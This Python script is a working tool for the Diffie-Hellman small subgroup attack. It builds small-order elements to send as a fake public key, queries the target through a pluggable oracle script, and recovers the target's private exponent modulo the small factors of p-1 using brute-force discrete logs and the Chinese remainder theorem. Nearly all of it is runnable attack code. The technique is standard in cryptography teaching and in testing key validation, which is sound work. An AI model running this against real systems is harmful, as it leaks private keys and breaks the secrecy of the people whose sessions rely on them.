#!/usr/bin/env python3
"""
Diffie-Hellman small subgroup attack.
When a DH implementation does not validate the peer public key's group membership,
an attacker can send a point of small order r to force the shared secret into a
subgroup of order r, leaking the secret modulo r.
After collecting enough pairs (secret mod r_i), CRT recovers the full secret.
"""

import argparse
import math
import sys


def extended_gcd(a: int, b: int) -> tuple[int, int, int]:
    if a == 0:
        return b, 0, 1
    g, x, y = extended_gcd(b % a, a)
    return g, y - (b // a) * x, x


def crt(remainders: list[int], moduli: list[int]) -> tuple[int, int]:
    """CRT: returns (x, M) where x ≡ r_i (mod m_i) and M = product(m_i)."""
    M = math.prod(moduli)
    x = 0
    for r, m in zip(remainders, moduli):
        Mi = M // m
        _, inv, _ = extended_gcd(Mi % m, m)
        x = (x + r * Mi * inv) % M
    return x, M


def find_small_order_elements(p: int, g: int, small_factors: list[int]) -> list[tuple[int, int]]:
    """
    For each small factor r of (p-1), find an element h of order r.
    h = g^((p-1)/r) mod p
    """
    elements = []
    for r in small_factors:
        if (p - 1) % r == 0:
            h = pow(g, (p - 1) // r, p)
            if h != 1:
                elements.append((r, h))
    return elements


def discrete_log_small(h: int, base: int, order: int, p: int) -> int | None:
    """Brute-force discrete log: find x in [0, order) s.t. base^x ≡ h (mod p)."""
    cur = 1
    for x in range(order):
        if cur == h:
            return x
        cur = cur * base % p
    return None


def main():
    parser = argparse.ArgumentParser(description="DH small subgroup attack")
    parser.add_argument("--p", required=True, help="DH prime modulus p")
    parser.add_argument("--g", required=True, help="DH generator g")
    parser.add_argument("--public-key", required=True, dest="A",
                        help="Target's public key A = g^x mod p")
    parser.add_argument("--factors", required=True,
                        help="Comma-separated small prime factors of (p-1) to exploit")
    parser.add_argument("--oracle-script", dest="oracle",
                        help="Python script exposing oracle(h_hex) -> shared_secret_hex. "
                             "If omitted, prints the small-order elements to send manually.")
    args = parser.parse_args()

    p = int(args.p, 0)
    g = int(args.g, 0)
    A = int(args.A, 0)
    factors = [int(f.strip()) for f in args.factors.split(',')]

    print(f"[*] p = {p}")
    print(f"[*] g = {g}")
    print(f"[*] A = {A}")
    print(f"[*] Small factors: {factors}")
    print(f"[*] p-1 factored: {math.prod(factors)} (partial)")

    elements = find_small_order_elements(p, g, factors)
    print(f"\n[*] Small-order elements to send as fake public key:")
    for r, h in elements:
        print(f"    order={r}  h={h}")

    if not args.oracle:
        print("\n[!] No oracle provided.")
        print("    Send each h to the target as your 'public key'.")
        print("    Record the resulting shared secret S = A^(private) mod p = h^x mod p.")
        print("    Then pass the (r, S) pairs back and use --oracle-script to automate.")
        return

    # Load oracle: oracle(h_hex) -> shared_secret_hex
    import importlib.util
    spec = importlib.util.spec_from_file_location("oracle", args.oracle)
    mod  = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    oracle = mod.oracle

    remainders = []
    moduli     = []

    for r, h in elements:
        shared_hex = oracle(hex(h))
        S = int(shared_hex, 16)
        # S = h^x mod p = g^((p-1)/r * x) mod p
        # We need x mod r: find k s.t. h^k ≡ S (mod p)
        k = discrete_log_small(S, h, r, p)
        if k is None:
            print(f"[!] Discrete log failed for order {r}")
            continue
        print(f"[+] x ≡ {k} (mod {r})")
        remainders.append(k)
        moduli.append(r)

    if remainders:
        x, M = crt(remainders, moduli)
        print(f"\n[+] x ≡ {x} (mod {M})  (partial secret via CRT)")
        print(f"    Verify: g^x mod p = {pow(g, x, p)}  (target A = {A})")


if __name__ == "__main__":
    main()
